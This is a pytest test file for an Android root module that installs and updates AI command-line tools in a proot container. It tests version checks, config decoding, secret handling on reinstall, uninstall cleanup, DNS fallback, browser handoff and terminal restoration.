        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.226')
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v2.1.283'})

        core.check_updates_json()
        data = json.loads(capsys.readouterr().out)   # must be parseable with no noise
        assert data['updates'] == 1
        app = data['apps'][0]
        assert app['id'] == 'claude-code'
        assert app['update_available'] is True
        assert app['cloud_version'] == '2.1.283'
        assert app['cloud_source'] == 'github:anthropics/claude-code'

    def test_list_apps_json_reports_cached_official_version(self, tmp_path, monkeypatch, capsys):
        self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226",
                                             "version_verified": True, "env": {}}})
        core._save_update_cache({"ts": 1700000000, "latest": {
            "claude-code": {"version": "2.1.283", "source": "github:anthropics/claude-code", "error": None}}})

        core.list_apps_json()
        data = json.loads(capsys.readouterr().out)
        app = data['apps'][0]
        assert data['last_check'] == 1700000000
        assert data['check_ttl'] == core.CHECK_TTL
        assert app['cloud_version'] == '2.1.283'
        assert app['update_available'] is True

    def test_list_apps_catalog_revision_reuses_only_static_fields(self, tmp_path, monkeypatch, capsys):
        registry = self._env(tmp_path, monkeypatch)
        monkeypatch.setattr(core, "_load_bundled_registry", lambda: registry)
        core.list_apps_json()
        original = json.loads(capsys.readouterr().out)
        revision = original["catalog_revision"]
        assert original["apps"][0]["name"] == "Claude Code"

        core.save_installed({"claude-code": {
            "executable": "claude", "installed_version": "2.1.283", "version_verified": True,
        }})
        core.list_apps_json(revision)
        cached = json.loads(capsys.readouterr().out)
        assert cached["catalog_unchanged"] is True
        assert cached["catalog_revision"] == revision
        app = cached["apps"][0]
        assert "name" not in app
        assert app["id"] == "claude-code"
        assert app["installed"] is True
        assert app["installed_version"] == "2.1.283"

        registry["apps"]["claude-code"]["description"] = "Updated catalog"
        core.list_apps_json(revision)
        changed = json.loads(capsys.readouterr().out)
        assert changed["catalog_unchanged"] is False
        assert changed["catalog_revision"] != revision
        assert changed["apps"][0]["description"] == "Updated catalog"

        monkeypatch.setattr(core, "VERSION", "another-version")
        core.list_apps_json(changed["catalog_revision"])
        assert json.loads(capsys.readouterr().out)["catalog_unchanged"] is False

    def test_list_apps_json_flags_update_for_unverified_legacy_record(self, tmp_path, monkeypatch, capsys):
        self._env(tmp_path, monkeypatch)
        # Legacy record: holds the AnCLI version (1.2.2) instead of the tool's own.
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "1.2.2", "env": {}}})
        core._save_update_cache({"ts": 1, "latest": {
            "claude-code": {"version": "2.1.283", "source": "github:anthropics/claude-code", "error": None}}})

        core.list_apps_json()
        app = json.loads(capsys.readouterr().out)['apps'][0]
        assert app['version_verified'] is False
        assert app['update_available'] is True   # no longer silently "up to date"

    def test_list_apps_json_reports_unknown_official_source(self, tmp_path, monkeypatch, capsys):
        self._env(tmp_path, monkeypatch, apps={
            "grok": {"name": "Grok CLI", "executable": "grok", "version_cmd": "grok --version",
                     "latest": {"source": "none"}, "version": "1.0.41"}})
        core.save_installed({"grok": {"name": "Grok CLI", "executable": "grok",
                                      "installed_version": "1.0.0", "version_verified": True, "env": {}}})
        core.list_apps_json()
        app = json.loads(capsys.readouterr().out)['apps'][0]
        assert app['cloud_source'] == 'none'
        assert app['update_available'] is False

    def test_update_app_failure_returns_false_and_keeps_record(self, tmp_path, monkeypatch, capsys):
        registry = self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        monkeypatch.setattr(core, 'run_cmd', lambda cmd: False)

        assert core.update_app('claude-code', registry) is False
        assert core.load_installed()['claude-code']['installed_version'] == '2.1.226'
        assert 'Update failed' in capsys.readouterr().out

    def test_update_app_success_records_probed_version(self, tmp_path, monkeypatch, capsys):
        registry = self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        monkeypatch.setattr(core, 'run_cmd', lambda cmd: True)
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.283')
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v2.1.283'})

        assert core.update_app('claude-code', registry) is True
        installed = core.load_installed()
        assert installed['claude-code']['installed_version'] == '2.1.283'
        assert installed['claude-code']['version_verified'] is True
        capsys.readouterr()

    def test_update_app_refreshes_official_version_without_claiming_a_full_check(self, tmp_path, monkeypatch, capsys):
        """The 更新 button pulls the vendor channel; the new official version must
        land in the cache right away, but `ts` (last full check) must not move."""
        registry = self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        monkeypatch.setattr(core, 'run_cmd', lambda cmd: True)
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.283')
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v2.1.283'})
        core._save_update_cache({"ts": 111, "latest": {}})

        assert core.update_app('claude-code', registry) is True
        cache = core._load_update_cache()
        assert cache['ts'] == 111
        assert cache['latest']['claude-code']['version'] == '2.1.283'
        assert 'official latest' in capsys.readouterr().out

    def test_update_app_warns_when_the_source_lags_behind(self, tmp_path, monkeypatch, capsys):
        registry = self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "1.0.0", "env": {}}})
        monkeypatch.setattr(core, 'run_cmd', lambda cmd: True)
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '1.0.0')
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v1.1.0'})

        core.update_app('claude-code', registry)
        out = capsys.readouterr().out
        assert 'may lag behind the vendor' in out

    def test_update_cmd_is_exposed_to_the_webui(self, tmp_path, monkeypatch, capsys):
        self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        core.list_apps_json()
        app = json.loads(capsys.readouterr().out)['apps'][0]
        assert 'releases/latest/download/claude-linux-arm64.tar.gz' in app['update_cmd']

# ---------------------------------------------------------------------------
# Registry schema: every app must be updatable by construction
# ---------------------------------------------------------------------------

def test_registry_declares_probe_and_official_source():
    with open(os.path.join(os.path.dirname(__file__), '..', 'src', 'registry.json'), encoding='utf-8') as f:
        reg = json.load(f)
    required_key = {'github': 'repo', 'pypi': 'package', 'npm': 'package',
                    'json': 'url', 'text': 'urls', 'static': None, 'none': None}
    assert reg['apps'], 'registry must define apps'
    for aid, app in reg['apps'].items():
        assert app.get('version_cmd'), f'{aid}: version_cmd is required to read the real installed version'
        assert app.get('version'), f'{aid}: a declared fallback version is required'
        spec = app.get('latest')
        assert isinstance(spec, dict), f'{aid}: latest spec is required'
        assert spec.get('source') in required_key, f'{aid}: unknown latest.source {spec.get("source")!r}'
        key = required_key[spec['source']]
        if key:
            assert spec.get(key), f'{aid}: latest.{key} is required for source {spec["source"]}'
        for field in ('executable', 'install_cmd', 'uninstall_cmd'):
            assert app.get(field), f'{aid}: {field} is required'


# ---------------------------------------------------------------------------
# Fixes from the independent review (findings reproduced on device)
# ---------------------------------------------------------------------------

def _core_paths(tmp_path, monkeypatch, apps=None):
    """Point the core at a scratch filesystem and return a small registry."""
    monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
    monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
    monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
    monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
    monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
    monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
    monkeypatch.setattr(core, "INSTALLED_FILE", str(tmp_path / "ancli" / "installed.json"))
    monkeypatch.setattr(core, "UPDATE_CACHE", str(tmp_path / "ancli" / ".update_cache.json"))
    os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)
    os.makedirs(tmp_path / "rootfs" / "usr" / "local" / "bin", exist_ok=True)
    return {"version": "1.2.3", "apps": apps if apps is not None else {
        "claude-code": {"name": "Claude Code", "executable": "claude",
                        "version_cmd": "claude --version",
                        "update_cmd": "curl -L https://example/claude.tar.gz",
                        "uninstall_cmd": "rm -f /usr/local/bin/claude",
                        "latest": {"source": "github", "repo": "anthropics/claude-code"},
                        "version": "2.1.283",
                        "optional_env_vars": ["ANTHROPIC_API_KEY"]},
    }}


class TestConfigEncoding:
    """WebUI sends percent-encoded --set values; they must be decoded on the way in
    and repaired on disk (tools were receiving literal 'https%3A%2F%2F...')."""

    def test_parse_set_env_decodes_percent_encoding(self):
        pairs = core.parse_set_env([
            "--set", "ANTHROPIC_BASE_URL=https%3A%2F%2Fapi.deepseek.com%2Fanthropic",
            "--set", "ANTHROPIC_MODEL=deepseek-v4-flash",
        ])
        assert pairs["ANTHROPIC_BASE_URL"] == "https://api.deepseek.com/anthropic"
        assert pairs["ANTHROPIC_MODEL"] == "deepseek-v4-flash"

    def test_parse_set_env_is_idempotent_for_plain_values(self):
        assert core.parse_set_env(["--set", "HTTP_PROXY=http://127.0.0.1:7890"])["HTTP_PROXY"] == \
            "http://127.0.0.1:7890"

    def test_migrate_decodes_stored_values_and_rewrites_secrets(self, tmp_path, monkeypatch, capsys):
        _core_paths(tmp_path, monkeypatch)
        (tmp_path / "ancli" / "installed.json").write_text(json.dumps({
            "claude-code": {"executable": "claude", "env": {
                "ANTHROPIC_BASE_URL": "https%3A%2F%2Fapi.deepseek.com%2Fanthropic",
                "ANTHROPIC_API_KEY": "sk-plain"}}}), encoding="utf-8")

        changed = core.migrate_encoded_env()

        assert changed == {"claude-code": {
            "ANTHROPIC_BASE_URL": "https://api.deepseek.com/anthropic",
            "ANTHROPIC_API_KEY": "sk-plain"}}
        stored = core.load_installed()["claude-code"]
        assert stored["configured_env"] == ["ANTHROPIC_BASE_URL", "ANTHROPIC_API_KEY"]
        secrets = (tmp_path / "secrets" / "claude.env").read_text(encoding="utf-8")
        assert "https://api.deepseek.com/anthropic" in secrets
        assert "%3A" not in secrets
        capsys.readouterr()

    def test_migrate_is_a_noop_for_clean_values(self, tmp_path, monkeypatch, capsys):
        _core_paths(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"executable": "claude",
                                             "env": {"ANTHROPIC_BASE_URL": "https://api.deepseek.com"}}})
        assert core.migrate_encoded_env() == {}
        assert not (tmp_path / "secrets" / "claude.env").exists()
        capsys.readouterr()


class TestReinstallKeepsConfig:
    def test_install_common_carries_env_and_secrets_over(self, tmp_path, monkeypatch, capsys):
        _core_paths(tmp_path, monkeypatch)
        (tmp_path / "ancli" / "installed.json").write_text(json.dumps({
            "claude-code": {"executable": "claude", "installed_version": "2.1.226",
                             "version_verified": True,
                             "env": {"ANTHROPIC_API_KEY": "sk-keep"}}}), encoding="utf-8")
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.283')
        app = {"name": "Claude Code", "executable": "claude", "version_cmd": "claude --version"}

        core._install_proot_common("claude-code", app)

        record = core.load_installed()["claude-code"]
        assert record["configured_env"] == ["ANTHROPIC_API_KEY"]   # not wiped by a re-install
        assert record["installed_version"] == "2.1.283"
        assert "secrets/claude.env" in (tmp_path / "ancli" / "bin" / "claude").read_text(encoding="utf-8")
        assert "sk-keep" in (tmp_path / "secrets" / "claude.env").read_text(encoding="utf-8")
        capsys.readouterr()


class TestUninstallFlow:
    def _install_artifacts(self, tmp_path):
        for path in (tmp_path / "ancli" / "bin" / "claude",
                     tmp_path / "mod" / "system" / "bin" / "claude",
                     tmp_path / "ksu" / "claude",
                     tmp_path / "ap" / "claude"):
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text("wrapper")
        (tmp_path / "secrets").mkdir(parents=True, exist_ok=True)
        (tmp_path / "secrets" / "claude.env").write_text("export K=1\n")

    def test_uninstall_removes_every_injection_path_and_the_cache_entry(self, tmp_path, monkeypatch, capsys):
        registry = _core_paths(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        core._save_update_cache({"ts": 1, "latest": {
            "claude-code": {"version": "2.1.283", "source": "github:x", "error": None}}})
        self._install_artifacts(tmp_path)
        monkeypatch.setattr(core, 'run_cmd', lambda cmd: True)

        assert core.uninstall_app("claude-code", registry) is True

        assert core.load_installed() == {}
        for path in (tmp_path / "ancli" / "bin" / "claude",
                     tmp_path / "mod" / "system" / "bin" / "claude",
                     tmp_path / "ksu" / "claude",
                     tmp_path / "ap" / "claude",
                     tmp_path / "secrets" / "claude.env"):
            assert not path.exists(), path
        assert 'claude-code' not in core._load_update_cache()['latest']
        capsys.readouterr()

    def test_uninstall_reports_failure_when_the_tool_command_fails(self, tmp_path, monkeypatch, capsys):
        registry = _core_paths(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        monkeypatch.setattr(core, 'run_cmd', lambda cmd: False)

        assert core.uninstall_app("claude-code", registry) is False
        assert core.load_installed() == {}      # record still removed, but exit code is honest
        capsys.readouterr()


class TestConcurrentWrites:
    def test_merge_does_not_resurrect_or_clobber_other_fields(self, tmp_path, monkeypatch):
        _core_paths(tmp_path, monkeypatch)
        core.save_installed({"a": {"installed_version": "2.0", "env": {"K": "v"},
                                   "installed_at": "t1"},
                             "b": {"installed_version": "9.9"}})

        core._merge_installed_fields({"a": {"installed_version": "1.0", "version_verified": True},
                                      "ghost": {"installed_version": "3.3"}})

        data = core.load_installed()
        assert data["a"]["installed_version"] == "1.0"     # this run is authoritative for it
        assert data["a"]["version_verified"] is True
        assert data["a"]["configured_env"] == ["K"]          # untouched fields survive
        assert data["a"]["installed_at"] == "t1"
        assert data["b"]["installed_version"] == "9.9"     # app installed mid-run survives
        assert "ghost" not in data                         # uninstalled app is not resurrected

    def test_check_updates_does_not_delete_an_app_installed_mid_run(self, tmp_path, monkeypatch, capsys):
        registry = _core_paths(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})

        def probe(app, reg=None):
            # Simulate the user installing another tool while the check is running.
            current = core.load_installed()
            current["opencode"] = {"executable": "opencode", "installed_version": "1.18.32"}
            core.save_installed(current)
            return '2.1.283'

        monkeypatch.setattr(core, '_probe_installed_version', probe)
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v2.1.283'})

        core.check_updates(registry)

        data = core.load_installed()
        assert "opencode" in data
        assert data["claude-code"]["installed_version"] == "2.1.283"
        capsys.readouterr()


class TestCheckFailureHandling:
    def test_failed_lookup_keeps_the_previously_resolved_version(self, tmp_path, monkeypatch, capsys):
        registry = _core_paths(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        core._save_update_cache({"ts": 111, "latest": {
            "claude-code": {"version": "2.1.283", "source": "github:anthropics/claude-code",
                            "error": None}}})

        def boom(url, timeout=15):
            raise OSError('network down')

        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.226')
        monkeypatch.setattr(core, '_http_json', boom)

        cache = core.check_updates(registry)

        entry = cache['latest']['claude-code']
        assert entry['version'] == '2.1.283'          # a transient outage must not wipe it
        assert 'network down' in entry['error']
        assert (cache['failed'], cache['succeeded']) == (1, 0)
        capsys.readouterr()

    def test_list_json_shortens_the_check_ttl_after_failures(self, tmp_path, monkeypatch, capsys):
        _core_paths(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        core._save_update_cache({"ts": 1, "latest": {}, "failed": 2})

        core.list_apps_json()

        data = json.loads(capsys.readouterr().out)
        assert data['check_ttl'] == core.CHECK_TTL_FAILED
        assert data['check_failed'] == 2

    def test_check_updates_json_reports_counts(self, tmp_path, monkeypatch, capsys):
        registry = _core_paths(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        monkeypatch.setattr(core, 'load_registry', lambda: registry)
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.226')
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v2.1.283'})

        cache = core.check_updates_json()

        assert (cache['succeeded'], cache['failed']) == (1, 0)
        capsys.readouterr()


class TestStateFilePermissions:
    """AnCLI is a root tool, so its state files need no world-write bit."""

    def test_installed_json_is_written_0644(self, tmp_path, monkeypatch):
        _core_paths(tmp_path, monkeypatch)
        modes = []
        monkeypatch.setattr(core.os, "chmod", lambda p, m: modes.append((os.path.basename(str(p)), m)))

        core.save_installed({"a": {"installed_version": "1.0"}})

        assert ('installed.json', 0o644) in modes
        assert not any(m == 0o666 for _, m in modes)

    def test_update_cache_is_written_0644(self, tmp_path, monkeypatch):
        _core_paths(tmp_path, monkeypatch)
        modes = []
        monkeypatch.setattr(core.os, "chmod", lambda p, m: modes.append((os.path.basename(str(p)), m)))

        assert core._save_update_cache({"ts": 1, "latest": {}}) is True

        assert ('.update_cache.json', 0o644) in modes
        assert not any(m == 0o666 for _, m in modes)


def test_release_version_strings_move_together():
    """module.prop, update.json and the core's VERSION are one release: the manager
    reads the first two while `ancli --version` and the WebUI read the third, so a
    half-bumped release shows two different versions."""
    root = os.path.join(os.path.dirname(__file__), '..')

    with open(os.path.join(root, 'src', 'module', 'module.prop'), encoding='utf-8') as f:
        prop = f.read()
    with open(os.path.join(root, 'update.json'), encoding='utf-8') as f:
        manifest = json.load(f)

    prop_version = re.search(r'^version=(.+)$', prop, re.M).group(1).strip()
    prop_code = int(re.search(r'^versionCode=(\d+)$', prop, re.M).group(1))

    # Pre-release / beta test builds intentionally keep update.json on the stable release
    # so KernelSU / Magisk managers do not alert production users of a test build.
    if "-beta" in prop_version or "-test" in prop_version:
        assert 'v' + core.VERSION == prop_version
        assert core.VERSION_CODE == prop_code
        with open(os.path.join(root, 'scripts', 'prepare_release.py'), encoding='utf-8') as f:
            prepare = f.read()
        assert 'VERSION_CODE' in prepare
        return

    assert prop_version == manifest['version'] == 'v' + core.VERSION
    assert prop_code == manifest['versionCode'] == core.VERSION_CODE
    assert manifest['zipUrl'].endswith(f"ancli-{prop_code}-{prop_version}.zip")

    # customize.sh announces the version in the flash log: it must read module.prop,
    # not carry a literal that goes stale (the v1.2.4 log said v1.2.3).
    with open(os.path.join(root, 'src', 'module', 'customize.sh'), encoding='utf-8') as f:
        customize = f.read()
    assert not re.search(r'Installer v?\d+\.\d+', customize), \
        'customize.sh must interpolate MODULE_VERSION instead of hardcoding it'
    assert 'MODULE_VERSION' in customize

    # registry.json carries a top-level version purely as bookkeeping (no code reads
    # it), which is exactly how it silently lagged a release behind. Keep it synced.
    with open(os.path.join(root, 'src', 'registry.json'), encoding='utf-8') as f:
        registry = json.load(f)
    assert registry.get('version') == core.VERSION, \
        'registry.json top-level version drifts from the core VERSION'

    # The release tool must not pin a version of its own: it edits five files from
    # one source, and the v1.2.4 cut shipped because it only knew about three.
    with open(os.path.join(root, 'scripts', 'prepare_release.py'), encoding='utf-8') as f:
        prepare = f.read()
    assert not re.search(r'^VERSION\s*=\s*[\'"]v?\d', prepare, re.M), \
        'prepare_release.py must take the version from argv/module.prop, not a literal'
    for target in ('module.prop', 'update.json', 'ancli-core.py', 'registry.json',
                   'CHANGELOG.md'):
        assert target in prepare, f'prepare_release.py must update {target}'


def test_github_release_downloads_fail_fast_and_are_verified():
    """GitHub-release installers must not silently unpack an HTML error page, and
    claude-code's published SHASUMS256.txt must actually be checked."""
    with open(os.path.join(os.path.dirname(__file__), '..', 'src', 'registry.json'), encoding='utf-8') as f:
        reg = json.load(f)
    github_apps = 0
    for aid, app in reg['apps'].items():
        cmd = app['install_cmd']
        if 'releases/latest/download' in cmd:
            github_apps += 1
            assert 'curl -fL' in cmd, f'{aid}: use `curl -fL` so a 404 fails instead of writing a body'
            assert '--retry' in cmd, f'{aid}: retry transient network failures'
            assert cmd.count('rm -f /tmp/') >= 1, f'{aid}: clean up the downloaded archive'
    assert github_apps >= 3, 'expected the GitHub-release apps to be covered'
    assert 'sha256sum -c' in reg['apps']['claude-code']['install_cmd'], \
        'claude-code ships SHASUMS256.txt — verify it'


def test_uninstall_instructions_explain_manager_purge():
    for language in ("zh", "en"):
        text = core.STRINGS[language]["uninstall_instructions"]
        assert "ancli_force_purge" not in text



class TestAndroidDnsDiscovery:
    """The core cannot execute Android's getprop/dumpsys from inside the glibc guest
    (verified on device), so the host-side wrapper caches the real resolvers."""

    def _fake_subprocess(self, monkeypatch, props, dump):
        def fake_check_output(cmd, shell=True, **kwargs):
            if cmd.startswith("getprop"):
                return props.get(cmd.split()[-1], "").encode()
            if cmd.startswith("dumpsys"):
                return dump.encode()
            raise AssertionError(f"unexpected command {cmd}")

        monkeypatch.setattr(core.subprocess, "check_output", fake_check_output)

    def _cache(self, tmp_path, monkeypatch, content):
        path = tmp_path / ".dns_cache"
        if content is not None:
            path.write_text(content, encoding="utf-8")
        monkeypatch.setattr(core, "DNS_CACHE", str(path))
        return path

    def test_reads_the_host_probed_cache_first(self, tmp_path, monkeypatch):
        self._cache(tmp_path, monkeypatch, "1790530000 192.168.1.1 2409:8080:2000:3::1\n")
        # Subprocess probes must not even be needed.
        monkeypatch.setattr(core.subprocess, "check_output",
                            lambda *a, **k: (_ for _ in ()).throw(AssertionError("probed anyway")))
        assert core._get_android_dns() == ["192.168.1.1"]   # IPv4 preferred, IPv6 dropped

    def test_ipv6_only_cache_is_used_when_nothing_else(self, tmp_path, monkeypatch):
        self._cache(tmp_path, monkeypatch, "1790530000 2409:8080:2000:3::1\n")
        assert core._get_android_dns() == ["2409:8080:2000:3::1"]

    def test_falls_back_to_props_when_no_cache(self, tmp_path, monkeypatch):
        self._cache(tmp_path, monkeypatch, None)
        self._fake_subprocess(monkeypatch, {"net.dns1": "10.0.0.1", "net.dns2": "10.0.0.1"},
                              "DnsAddresses: [ /1.1.1.1 ]")
        assert core._get_android_dns() == ["10.0.0.1"]

    def test_falls_back_to_dumpsys_when_props_are_empty(self, tmp_path, monkeypatch):
        self._cache(tmp_path, monkeypatch, None)
        dump = ("DnsAddresses: [ /2409:8080:2000:3::1,/2409:8080:2000:3::2 ]\n"
                "DnsAddresses: [ /192.168.1.1 ]")
        self._fake_subprocess(monkeypatch, {"net.dns1": "", "net.dns2": ""}, dump)
        assert core._get_android_dns() == ["192.168.1.1"]

    def test_rejects_loopback_and_placeholder(self, tmp_path, monkeypatch):
        self._cache(tmp_path, monkeypatch, None)
        self._fake_subprocess(monkeypatch, {"net.dns1": "127.0.0.1", "net.dns2": "0.0.0.0"},
                              "DnsAddresses: [ /192.168.1.1 ]")
        assert core._get_android_dns() == ["192.168.1.1"]

    def test_resolv_conf_keeps_public_fallbacks_last(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path))
        os.makedirs(tmp_path / "etc", exist_ok=True)
        self._cache(tmp_path, monkeypatch, "1790530000 192.168.1.1\n")

        core._write_resolv_conf()

        lines = (tmp_path / "etc" / "resolv.conf").read_text(encoding="utf-8").splitlines()
        assert lines[0] == "nameserver 192.168.1.1"     # the real network DNS leads
        assert "nameserver 223.5.5.5" in lines
        assert len(lines) == 3                          # glibc reads only three
        assert "8.8.8.8" not in lines                   # not first, and slots are full


class TestBrowserHandoff:
    """`dsh web` (npm `open` → xdg-open) must reach the phone's browser.

    Android's `am`/`cmd` cannot execute inside the glibc guest, so the container
    shim only queues the URL and the host-side wrapper drains it into `am start`."""

    def _paths(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)
        os.makedirs(tmp_path / "rootfs" / "usr" / "local" / "bin", exist_ok=True)

    def test_container_shim_queues_the_url_instead_of_calling_am(self, tmp_path, monkeypatch):
        self._paths(tmp_path, monkeypatch)
        core._deploy_xdg_open()

        shim = tmp_path / "rootfs" / "usr" / "local" / "bin" / "xdg-open"
        text = shim.read_text(encoding="utf-8")
        # Compare separator-insensitively: the shim is a POSIX script, but the test
        # runs on Windows too, where ANCLI_DIR carries backslashes.
        queue = str(tmp_path / "ancli" / ".open_url").replace("\\", "/")
        assert queue in text.replace("\\", "/")                    # hands off to the host
        assert "/system/bin/am" not in text                        # cannot exec there
        assert os.access(shim, os.X_OK)
        # lookups that hardcode /usr/bin or /bin still resolve (symlinks need
        # privileges on Windows, so only check them where the module actually runs)
        if os.name == "posix":
            assert (tmp_path / "rootfs" / "usr" / "bin" / "xdg-open").is_symlink()
            assert (tmp_path / "rootfs" / "bin" / "sensible-browser").is_symlink()

    def test_deploy_xdg_open_never_clobbers_host_bin(self, tmp_path, monkeypatch):
        self._paths(tmp_path, monkeypatch)
        os.makedirs(tmp_path / "ksu", exist_ok=True)
        host_xdg = tmp_path / "ksu" / "xdg-open"
        host_xdg.write_text("unrelated host handler", encoding="utf-8")

        core._deploy_xdg_open()

        assert host_xdg.read_text(encoding="utf-8") == "unrelated host handler"
        assert (tmp_path / "rootfs" / "usr" / "local" / "bin" / "xdg-open").exists()
        assert (tmp_path / "rootfs" / "usr" / "local" / "bin" / "sensible-browser").exists()

    def test_generated_wrapper_drains_the_queue_with_am(self, tmp_path, monkeypatch):
        self._paths(tmp_path, monkeypatch)
        core.generate_proot_wrapper("dsh", {}, [])

        wrapper = (tmp_path / "ancli" / "bin" / "dsh").read_text(encoding="utf-8")
        assert ".open_url" in wrapper
        assert "ancli_open_drain" in wrapper
        assert "/system/bin/am start -a android.intent.action.VIEW" in wrapper
        assert "kill -0 \"$PPID\"" in wrapper      # watcher dies with the wrapper
        assert '"$@"' in wrapper                   # the tool still gets its arguments

    def test_wrapper_watcher_only_starts_when_the_queue_is_writable(self, tmp_path, monkeypatch):
        self._paths(tmp_path, monkeypatch)
        core.generate_proot_wrapper("dsh", {}, [])
        wrapper = (tmp_path / "ancli" / "bin" / "dsh").read_text(encoding="utf-8")
        assert '[ -w "$(dirname "$ANCLI_OPEN_QUEUE")" ]' in wrapper

    def test_wrapper_points_browser_at_the_handoff_shim(self, tmp_path, monkeypatch):
        """The npm `open` package prefers its vendored xdg-open, which finds no
        method on a headless container (rc 3) unless BROWSER points at our shim."""
        self._paths(tmp_path, monkeypatch)
        core.generate_proot_wrapper("dsh", {}, [])

        wrapper = (tmp_path / "ancli" / "bin" / "dsh").read_text(encoding="utf-8")
        assert "export PROOT_NO_SECCOMP=1" in wrapper
        assert "/usr/bin/env ANCLI_IN_CONTAINER=1 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/root/.local/bin:/data/adb/ksu/bin:/data/adb/ap/bin:/system/bin SHELL=/bin/bash BROWSER=/usr/local/bin/xdg-open dsh" in wrapper
        assert "/data/adb/ksu/bin:/data/adb/ap/bin" in wrapper.split("PATH=")[1].split()[0]

    def test_wrapper_prefers_a_full_browser_over_the_chooser(self, tmp_path, monkeypatch):
        """No default browser => `am start` raises "Open with"; a WebView-based pick
        can drop the auth cookie, so a known browser is targeted explicitly."""
        self._paths(tmp_path, monkeypatch)
        core.generate_proot_wrapper("dsh", {}, [])

        wrapper = (tmp_path / "ancli" / "bin" / "dsh").read_text(encoding="utf-8")
        assert "com.android.chrome" in wrapper
        assert 'pm list packages "$_ancli_pkg"' in wrapper
        assert '-p "$_ancli_pkg"' in wrapper
        # the generic intent stays as the fallback for devices without those browsers
        assert '/system/bin/am start -a android.intent.action.VIEW -d "$1"' in wrapper
        assert "ancli_open_browser" in wrapper


class TestTerminalRestore:
    """A full-screen TUI (mimo, agy, opencode) leaves the tty in raw mode when it
    dies without restoring it: the caller's shell then looks dead — no echo, Enter
    only moves the cursor, no command runs — and only a new terminal recovers it.
    The guest process is gone by then, so the wrapper is the last chance to put
    termios back; `exec` must not be used because it replaces that wrapper."""

    def _paths(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)

    def test_proot_wrapper_saves_and_restores_the_tty(self, tmp_path, monkeypatch):
        self._paths(tmp_path, monkeypatch)
        core.generate_proot_wrapper("mimo", {}, [])
        wrapper = (tmp_path / "ancli" / "bin" / "mimo").read_text(encoding="utf-8")

        assert "stty -g" in wrapper
        assert 'stty "$_ancli_saved_tty"' in wrapper
        assert "trap 'ancli_restore_tty' EXIT" in wrapper
        assert "ancli_restore_tty" in wrapper.split("proot -r", 1)[1]
        assert not re.search(r"^exec ", wrapper, re.M), \
            "the wrapper must survive the tool so it can restore the terminal"

